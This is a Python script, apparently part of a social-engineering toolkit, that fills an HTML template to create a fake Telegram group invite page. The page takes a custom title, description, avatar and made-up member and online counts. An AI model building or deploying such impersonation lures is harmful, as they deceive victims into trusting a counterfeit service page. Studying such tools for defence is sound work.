#!/usr/bin/env python3

import os
import shutil
import utils

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white
Y = '\033[33m' # yellow


title = os.getenv('TITLE')
image = os.getenv('IMAGE')
desc = os.getenv('DESC')
mem_num = os.getenv('MEM_NUM')
online_num = os.getenv('ONLINE_NUM')

if title is None:
    title = input(f'{G}[+] {C}Group Title : {W}')
else:
    utils.print(f'{G}[+] {C}Group Title :{W} '+title)

if image is None:
    image = input(f'{G}[+] {C}Image Path/URL (Press Enter to Skip/Default): {W}')
else:
    utils.print(f'{G}[+] {C}Image :{W} '+image)

if desc is None:
    desc = input(f'{G}[+] {C}Group Description: {W}')
else:
    utils.print(f'{G}[+] {C}Group Description :{W} '+desc)

if mem_num is None:
    mem_num = input(G + '[+]' + C + ' Number of Members : ' + W)
else:
    utils.print(f'{G}[+] {C}Number of Members :{W} '+mem_num)

if online_num is None:
    online_num = input(G + '[+]' + C + ' Number of Members Online : ' + W)
else:
    utils.print(f'{G}[+] {C}Number of Members Online :{W} '+mem_num)

img_name = "default_avatar.jpg"
if image and image.strip() != "":
    img_name_downloaded = utils.downloadImageFromUrl(image, 'template/telegram/images/')
    if img_name_downloaded:
        img_name = os.path.basename(img_name_downloaded)
    else:
        # local file copy
        possible_img_name = os.path.basename(image)
        try:
            shutil.copyfile(image, 'template/telegram/images/{}'.format(possible_img_name))
            img_name = possible_img_name
        except Exception as e:
            utils.print('\n' + Y + '[!]' + C + ' Gagal memuat gambar kustom, menggunakan avatar default: ' + W + str(e))
            img_name = "default_avatar.jpg"
else:
    utils.print(f'{Y}[!] Tidak ada gambar dimasukkan, menggunakan avatar default.{W}')


with open('template/telegram/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP") == "1":
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('$DESC$', desc)
    code = code.replace('$MEMBERS$', mem_num)
    code = code.replace('$ONLINE$', online_num)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/telegram/index.html', 'w') as new_index:
    new_index.write(code)